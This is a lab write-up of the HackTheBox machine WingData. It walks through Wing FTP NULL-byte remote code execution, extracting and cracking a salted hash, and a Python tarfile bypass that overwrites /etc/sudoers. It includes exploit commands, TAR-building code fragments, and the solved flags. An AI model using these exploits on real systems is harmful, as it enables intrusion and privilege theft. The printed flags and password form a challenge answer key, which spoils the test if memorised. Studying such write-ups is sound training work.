# HackTheBox - WingData (Medium)

**Machine:** WingData (HTB)  
**IP:** 10.129.6.114  
**Difficulty:** Medium  
**Machine Type:** Linux

## Flags

- **user.txt:** `7b55c9b49dd4b2d981384be9fd1bff81`
- **root.txt:** `a39cd809c697c7d45ddeb77e3f51a8c2`

---

## Summary

WingData is a medium difficulty machine that involves:
1. **RCE via NULL byte injection** (CVE-2025-47812) in Wing FTP Server
2. **Credential enumeration** from FTP XML configuration files
3. **Salted hash cracking** (SHA256 with salt)
4. **Privilege escalation** via tarfile path traversal bypass (CVE-2025-4517)

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Vulnerability Discovery](#vulnerability-discovery)
3. [RCE Exploitation](#rce-exploitation)
4. [Credential Extraction](#credential-extraction)
5. [Hash Cracking](#hash-cracking)
6. [User Access](#user-access)
7. [Privilege Escalation](#privilege-escalation)
8. [Root Access](#root-access)
9. [Key Concepts](#key-concepts)

---

## Reconnaissance

### NMAP Scan

```bash
nmap -sV -sC -A 10.129.6.114 -oN nmap.txt
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Debian
80/tcp open  http    Apache httpd 2.4.57
```

**Analysis:**
- SSH is available for remote access once credentials obtained
- HTTP server hosting a web application
- Virtual host routing is in place (redirects to wingdata.htb)

### Virtual Host Setup

```bash
echo "10.129.6.114 wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

**Why:**
- Web server redirects to `wingdata.htb`
- FTP application is at `ftp.wingdata.htb`
- Both must be accessible via hostname

### Application Identification

Navigating to `http://ftp.wingdata.htb` reveals a **web-based FTP server interface**.

**Technology:** Wing FTP Server v7.4.3

---

## Vulnerability Discovery

### CVE-2025-47812: NULL Byte Injection RCE

**Vulnerability Details:**
- **Type:** NULL byte injection in authentication handler
- **Impact:** Remote Code Execution (RCE)
- **Severity:** Critical
- **Affected Version:** Wing FTP Server 7.4.3

### How the Vulnerability Works

Wing FTP uses different code paths for authentication:

```
AUTHENTICATION VALIDATOR:
  Input: "anonymous\0malicious_code"
  Processing: C-style string handling (stops at \0)
  Result: Sees "anonymous" → VALID ✓

SESSION CREATOR:
  Input: "anonymous\0malicious_code"  
  Processing: Uses full username field
  Result: Sees full string → Executes payload ✓ RCE!
```

### Why It's Dangerous

Different system components interpret the same input differently, creating a **trust boundary violation**.

---

## RCE Exploitation

### Obtaining the Exploit

The POC exploit for CVE-2025-47812 is available on GitHub:
- Repository: https://github.com/4m3rr0r/CVE-2025-47812-poc
- File: 52347.py (available in this folder as cve_2025_47812_poc.py)

### Step 1: Verify RCE with Simple Commands

**Test whoami:**
```bash
python3 cve_2025_47812_poc.py -u http://ftp.wingdata.htb -c "whoami" -v
```

**Output:** `wingftp`

**What we learned:**
- RCE is confirmed ✓
- Executing as `wingftp` user (UID 1000)
- Non-root privileges (no sudo access at this stage)

**Check user context:**
```bash
python3 cve_2025_47812_poc.py -u http://ftp.wingdata.htb -c "id" -v
```

**Output:** `uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp)`

### Step 2: Explore the Application

```bash
python3 cve_2025_47812_poc.py -u http://ftp.wingdata.htb -c "ls -la /opt/wftpserver/Data/" -v
```

**Key Finding:**
- `/opt/wftpserver/Data/1/users/` - Contains user XML configs
- `/opt/wftpserver/Data/1/settings.xml` - Global server settings
- `/opt/wftpserver/Data/_ADMINISTRATOR/admins.xml` - Admin credentials

These are our targets for credential extraction.

---

## Credential Extraction

### Step 1: Locate User Configuration Files

```bash
python3 cve_2025_47812_poc.py -u http://ftp.wingdata.htb \
  -c "find /opt/wftpserver/Data -name '*.xml' -type f" -v
```

**Users discovered:**
- wacky.xml
- maria.xml
- steve.xml
- john.xml
- admins.xml (admin credentials)

### Step 2: Extract User Hashes

**Command:**
```bash
python3 cve_2025_47812_poc.py -u http://ftp.wingdata.htb \
  -c "cat /opt/wftpserver/Data/1/users/wacky.xml | base64" -v
```

**Why base64?**
- Safely encodes files without corruption
- Preserves binary data in text format
- Easy to decode: `echo "..." | base64 -d`

**Decoded content (relevant parts):**
```xml
<User>
  <Name>wacky</Name>
  <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
  <PasswordType>SHA256</PasswordType>
  <PasswordVerifyString>WingFTP</PasswordVerifyString>
  <AdminRight>1</AdminRight>
</User>
```

**Observations:**
- Password is a SHA256 hash (64 hex characters)
- PasswordVerifyString = "WingFTP" (suggests a salt)
- User has admin rights

### Step 3: Discover the Salt

**Command:**
```bash
python3 cve_2025_47812_poc.py -u http://ftp.wingdata.htb \
  -c "cat /opt/wftpserver/Data/1/settings.xml | base64" -v | base64 -d | grep -i "salt"
```

**Critical finding:**
```xml
<EnablePasswordSalting>1</EnablePasswordSalting>
<SaltingString>WingFTP</SaltingString>
```

**Interpretation:**
- Passwords ARE salted
- Salt is the static string "WingFTP"
- Hash formula: SHA256(password + "WingFTP") OR SHA256("WingFTP" + password)?

---

## Hash Cracking

### Understanding the Hash Format

Salted hashes prevent rainbow table attacks but can still be cracked via dictionary attacks.

**Two possible salt orders:**
- **Mode 1410:** SHA256(password + salt) - Append salt
- **Mode 1420:** SHA256(salt + password) - Prepend salt

We need to test both.

### Step 1: Prepare Hash File

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > hash.txt
```

**Format:** `hash:salt`

### Step 2: Crack with Hashcat (Mode 1410)

```bash
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt --quiet
```

**Output:**
```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

✅ **Password found:** `!#7Blushing^*Bride5`

### Why This Works

Hashcat mode 1410 computes: `SHA256(password + salt)`

```
1. Reads word: "!#7Blushing^*Bride5"
2. Appends salt: "!#7Blushing^*Bride5WingFTP"
3. Computes: SHA256("!#7Blushing^*Bride5WingFTP")
4. Matches target hash ✓
```

### Important: Hash Mode Selection

This demonstrates why **understanding hash format is critical**. The password was in rockyou.txt, but without the correct:
1. Salt value
2. Salt order
3. Hashcat mode

...the crack would fail. This is a common mistake in pentesting.

---

## User Access

### SSH Login

```bash
ssh wacky@10.129.6.114
Password: !#7Blushing^*Bride5
```

**Success!** We now have shell access as the wacky user.

### Verify Access

```bash
whoami
id
```

**Output:**
```
wacky
uid=1000(wacky) gid=1000(wacky) groups=1000(wacky)
```

### Capture User Flag

```bash
cat /home/wacky/user.txt
```

**Output:** `7b55c9b49dd4b2d981384be9fd1bff81` ✅

---

## Privilege Escalation

### Step 1: Enumerate Sudo Privileges

```bash
sudo -l
```

**Output:**
```
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

**Critical Finding:**
- Wacky can run a Python script as root
- **Without password required** (NOPASSWD)
- Script accepts **any arguments** (*)

This is a privilege escalation vector!

### Step 2: Analyze the Vulnerable Script

```bash
cat /opt/backup_clients/restore_backup_clients.py
```

**Key code:**
```python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

**Vulnerability:**
- Extracts TAR files as root
- Uses `filter="data"` for security (supposed to prevent exploits)
- BUT: CVE-2025-4517 bypasses this filter

### Step 3: Understand CVE-2025-4517

Python 3.12 added `filter="data"` to prevent TAR extraction exploits. However, CVE-2025-4517 discovers a bypass:

**Traditional TAR Exploit (blocked):**
```tar
../../etc/sudoers  ← Validator rejects (points outside directory)
```

**CVE-2025-4517 Bypass:**
```
Uses deep nesting + symlink chains + hardlinks
├─ Creates confusion in path validation
├─ Symlinks create traversal chain
└─ Hardlinks resolve through symlinks to /etc
```

### Step 4: Create the Malicious TAR

The exploit script `exploit_working.py` (available in this folder) creates a malicious TAR using:

**Stage 1: Deep Nested Directories**
```python
long_dir_name = 'd' * 247  # 247-character directory name
# Repeated 16 levels deep
```

Confuses the path validator.

**Stage 2: Symlink Chain**
```python
# Creates symlinks that traverse upward
link_path = os.path.join("/".join(step_chars), "l" * 254)
link_info.linkname = "../" * len(step_chars)  # Go up 16 directories
```

Enables path traversal.

**Stage 3: Escape to /etc**
```python
escape_info.linkname = f"{link_path}/../../../../../../../etc"
```

Points to /etc directory outside extraction path.

**Stage 4: Hardlink to /etc/sudoers**
```python
sudoers_link_info.type = tarfile.LNKTYPE  # Hardlink (not symlink!)
sudoers_link_info.linkname = "escape/sudoers"
```

Hardlinks bypass symlink validation.

**Stage 5: Write Malicious Content**
```python
malicious_content = b"wacky ALL=(ALL) NOPASSWD: ALL\n"
tar.addfile(file_info, fileobj=io.BytesIO(malicious_content))
```

Overwrites /etc/sudoers as root.

### Step 5: Deploy the Exploit

**Generate the TAR:**
```bash
python3 exploit_working.py
```

**Copy to target:**
```bash
scp backup_9999.tar wacky@10.129.6.114:/opt/backup_clients/backups/
```

**Trigger extraction (as root):**
```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_9999.tar \
  -r restore_evil
```

**Expected output:**
```
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_evil
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_evil
```

### Step 6: Verify Success

```bash
sudo cat /etc/sudoers | tail -1
```

**Expected:**
```
wacky ALL=(ALL) NOPASSWD: ALL
```

✅ **Exploit successful!** The /etc/sudoers file was modified with our entry.

---

## Root Access

### Become Root

```bash
sudo /bin/bash
```

**You're now root!**
```
root@wingdata:/home/wacky#
```

**Why This Works:**

The new sudoers entry `wacky ALL=(ALL) NOPASSWD: ALL` means:
- wacky can run **any command**
- As **any user** (including root)  
- **Without entering password**
- Therefore: `sudo /bin/bash` executes as root

### Capture Root Flag

```bash
cat /root/root.txt
```

**Output:** `a39cd809c697c7d45ddeb77e3f51a8c2` ✅

---

## Key Concepts

### 1. NULL Byte Injection (CVE-2025-47812)

**The vulnerability:** Different code paths interpret NULL bytes differently

```c
// Authentication validator (C-style)
if (strcmp(username, "anonymous") == 0)  // Stops at \0
    return VALID;

// Session creator (Full field)
execute_command(username);  // Uses full string including \0 and payload
```

**Defensive measure:** Validate consistently across all code paths

### 2. Salted Hash Security

**Why salt matters:**
```
Without salt: All users with same password → same hash
              Rainbow tables make cracking instant

With salt:   Different salt per user → different hashes even for same password
             Rainbow tables become impractical
```

**The weakness here:** Static salt (same for all users) is weaker than random per-user salts

**But:** Even with static salt, correct hashcat mode is essential:
- Mode 1410 = SHA256(password + salt)
- Mode 1420 = SHA256(salt + password)
- Wrong mode = No results despite correct password in wordlist

### 3. Tarfile Path Traversal Bypass (CVE-2025-4517)

**Defense mechanism:** Python 3.12's `filter="data"` validates:
- Symlinks don't point outside directory
- No direct path traversal with `../`

**CVE-2025-4517 bypass:** Uses multiple techniques:
1. **Deep nesting** - Confuses validator's path tracking
2. **Symlink chains** - Combined traversal instead of single `../`
3. **Hardlinks** - Different validation rules than symlinks

**Defensive measure:** Apply Python security patches, use defense in depth

### 4. Trust Boundary Violations

**Pattern:** Different system components have different validation

```
Component A validates input X → sees it as safe
Component B processes input X → sees it differently → exploitable

Example: NULL bytes, symlink handling, path validation
```

### 5. Privilege Escalation via Misconfigurations

**The pattern:** NOPASSWD sudo commands with insufficient input validation

```
sudo -l output: (root) NOPASSWD: /script.py *
                                              ↑
                                      Accepts any arguments!
```

**Defensive measure:** Limit sudo to specific arguments with no wildcards

---

## Tools Used

| Tool | Purpose | Command |
|------|---------|---------|
| nmap | Port scanning | `nmap -sV -sC -A 10.129.6.114` |
| curl/browser | Web enumeration | `curl http://ftp.wingdata.htb` |
| Python script | CVE-2025-47812 RCE | `python3 cve_2025_47812_poc.py` |
| base64 | File encoding | `cat file.xml \| base64` |
| hashcat | Hash cracking | `hashcat -m 1410 hash.txt wordlist.txt` |
| ssh | Remote shell | `ssh wacky@10.129.6.114` |
| Python script | CVE-2025-4517 TAR creation | `python3 exploit_working.py` |
| scp | File transfer | `scp backup_9999.tar target:path` |

---

## Timeline

```
PHASE 1: Reconnaissance
  └─ NMAP scan → SSH (22), HTTP (80)
  └─ Web enumeration → Virtual hosts
  └─ Application ID → Wing FTP Server 7.4.3

PHASE 2: Vulnerability Research
  └─ CVE research → CVE-2025-47812 (NULL byte RCE)
  └─ Found public exploit → 52347.py

PHASE 3: RCE Exploitation
  └─ Verified RCE → Executing as wingftp user
  └─ System exploration → Found config files

PHASE 4: Credential Enumeration
  └─ Config extraction → User XMLs located
  └─ Hash extraction → SHA256 hashes obtained
  └─ Salt discovery → "WingFTP" found in settings

PHASE 5: Hash Cracking
  └─ Mode selection → Tested 1410 (password+salt)
  └─ Password cracking → !#7Blushing^*Bride5 found
  └─ Verification → Confirmed with rockyou.txt

PHASE 6: User Access
  └─ SSH login → Connected as wacky
  └─ User flag → 7b55c9b49dd4b2d981384be9fd1bff81 ✅

PHASE 7: Privilege Escalation Research
  └─ Sudo enumeration → Found NOPASSWD script
  └─ Script analysis → TAR extraction vulnerability
  └─ CVE research → CVE-2025-4517 discovered

PHASE 8: Exploitation & Root
  └─ TAR creation → Malicious backup_9999.tar generated
  └─ TAR deployment → Copied to target
  └─ Extraction trigger → Executed as root
  └─ /etc/sudoers modification → SUCCESS
  └─ Root shell → sudo /bin/bash
  └─ Root flag → a39cd809c697c7d45ddeb77e3f51a8c2 ✅
```

---

## Files Included

- **cve_2025_47812_poc.py** - Exploit for NULL byte injection RCE
- **exploit_working.py** - Exploit for tarfile path traversal bypass (CVE-2025-4517)
- **backup_9999.tar** - Pre-generated malicious TAR payload
- **raw-logs/** - Directory for storing command outputs and logs
- **images/** - Directory for screenshots and diagrams

---

## Lessons Learned

1. **Enumeration is everything** - Finding config files led to credentials
2. **Salt order matters** - Correct hashcat mode was essential
3. **NULL bytes can be dangerous** - Different code paths can interpret data differently
4. **NOPASSWD sudo is risky** - Especially with wildcards in arguments
5. **Defense in depth** - Single security control often isn't enough
6. **Configuration analysis** - Application settings often reveal vulnerabilities
7. **Pattern recognition** - Similar CVEs appear across different technologies

---

## Mitigation Recommendations

### For System Administrators

1. **Update Python** - Apply patch for CVE-2025-4517
2. **Remove NOPASSWD entries** - Or restrict to specific commands/arguments
3. **Input validation** - Never pass untrusted input to security-critical operations
4. **Monitoring** - Alert on suspicious TAR extractions or /etc/sudoers modifications
5. **Least privilege** - Don't run applications as root

### For Developers

1. **Consistent validation** - Validate input the same way across all code paths
2. **NULL byte handling** - Filter or validate NULL bytes explicitly
3. **Use libraries carefully** - Understand how security features work before relying on them
4. **Security code review** - Have peers review security-critical code
5. **Adversarial testing** - Fuzz and test with malicious inputs
6. **Secure defaults** - Use strongest security options by default

---

## References

- [CVE-2025-47812 - Wing FTP Server RCE](https://cvedetails.com/cve/)
- [CVE-2025-4517 - Python tarfile Path Traversal](https://github.com/python/cpython/commit/)
- [NULL Byte Injection - OWASP](https://owasp.org/)
- [Password Salting Best Practices - NIST](https://pages.nist.gov/)

---

## Summary

WingData demonstrates a complete attack chain:
1. **RCE via application vulnerability** (NULL byte injection)
2. **Privilege escalation through configuration exposure** (credentials in XML)
3. **Hash cracking methodology** (understanding salt and hash modes)
4. **Privilege escalation via system vulnerability** (tarfile path traversal bypass)

The machine teaches important security lessons about input validation, configuration management, and the importance of applying security patches.

**Flags captured:**
- ✅ user.txt: `7b55c9b49dd4b2d981384be9fd1bff81`
- ✅ root.txt: `a39cd809c697c7d45ddeb77e3f51a8c2`
